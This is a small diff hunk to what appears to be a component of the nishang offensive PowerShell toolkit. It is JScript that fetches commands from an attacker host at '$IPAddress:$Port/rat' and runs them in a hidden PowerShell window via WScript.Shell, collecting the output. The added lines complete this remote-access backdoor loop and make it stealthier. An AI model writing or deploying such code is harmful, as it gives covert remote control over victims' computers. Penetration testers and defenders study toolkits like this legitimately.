@@ -124,7 +124,8 @@ https://github.com/samratashok/nishang
                                 {
                                     h.Open(""GET"",""http://$IPAddress`:$Port/rat"",false);
 							        h.Send();
-							        ps = 'powershell.exe ';
+							        c = h.ResponseText;
+                                    ps = 'powershell.exe -w h -nologo -noprofile ';
 							        r = new ActiveXObject(""WScript.Shell"").Exec(ps + c);
 							        var so;
 							        while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll();}
